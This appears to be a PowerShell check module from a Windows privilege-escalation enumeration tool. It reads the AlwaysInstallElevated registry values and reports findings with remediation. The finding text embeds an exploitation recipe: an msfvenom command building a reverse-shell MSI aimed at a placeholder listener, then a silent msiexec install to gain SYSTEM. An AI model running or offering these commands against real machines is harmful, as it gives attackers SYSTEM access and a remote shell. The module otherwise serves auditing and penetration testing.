# check_id: always_install
# check_name: AlwaysInstallElevated
# category: configuration
# description: Checks if AlwaysInstallElevated is enabled in HKLM and HKCU
# requires_admin: false
# opsec_impact: low
# estimated_time_seconds: 1

function Invoke-CheckAlwaysInstall {
    [CmdletBinding()]
    param(
        [hashtable]$Config = @{}
    )

    $findings = @()
    $ErrorActionPreference = "SilentlyContinue"

    $regPath = "SOFTWARE\Policies\Microsoft\Windows\Installer"
    $valueName = "AlwaysInstallElevated"

    # Query both hives via reg.exe (works without PS registry provider quirks)
    $hklmOut = (& reg query "HKLM\$regPath" /v $valueName 2>&1) | Out-String
    $hkcuOut = (& reg query "HKCU\$regPath" /v $valueName 2>&1) | Out-String

    # Parse the values - reg.exe outputs "    AlwaysInstallElevated    REG_DWORD    0x1"
    $hklmEnabled = $hklmOut -match "AlwaysInstallElevated\s+REG_DWORD\s+0x1"
    $hkcuEnabled = $hkcuOut -match "AlwaysInstallElevated\s+REG_DWORD\s+0x1"

    $rawEvidence = @"
=== HKLM\$regPath ===
$hklmOut
=== HKCU\$regPath ===
$hkcuOut
"@

    # Raw context finding - always emitted
    $findings += New-Finding `
        -CheckId    "always_install" `
        -FindingId  "always_install_raw" `
        -Severity   "info" `
        -Title      "AlwaysInstallElevated Registry Output" `
        -Description "Raw registry query output for AlwaysInstallElevated in both HKLM and HKCU." `
        -Evidence   $rawEvidence `
        -Tags       @("configuration", "msi", "registry", "raw")

    # Analytical finding - only when exploitable
    if ($hklmEnabled -or $hkcuEnabled) {
        $hklmStatus = if ($hklmEnabled) { "ENABLED (0x1)" } else { "not set / disabled" }
        $hkcuStatus = if ($hkcuEnabled) { "ENABLED (0x1)" } else { "not set / disabled" }

        $description = @"
AlwaysInstallElevated allows any user to install MSI packages with SYSTEM privileges.
When both HKLM and HKCU keys are set to 1, any low-privileged user can craft a malicious
MSI and execute arbitrary code as SYSTEM. Even a single hive set to 0x1 may be exploitable
depending on the Windows version.

HKLM status : $hklmStatus
HKCU status : $hkcuStatus

Exploitation: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi
              msiexec /quiet /qn /i evil.msi
"@

        $findings += New-Finding `
            -CheckId     "always_install" `
            -FindingId   "always_install_elevated" `
            -Severity    "critical" `
            -Title       "AlwaysInstallElevated Enabled - MSI Install as SYSTEM" `
            -Description $description `
            -Evidence    $rawEvidence `
            -Remediation 'Disable AlwaysInstallElevated in Group Policy: Computer Configuration > Administrative Templates > Windows Components > Windows Installer > Always install with elevated privileges = Disabled. Apply the same under User Configuration.' `
            -Tags        @("configuration", "msi", "privilege-escalation", "registry") `
            -ToolHint    @("msfvenom", "msiexec")
    }

    return $findings
}
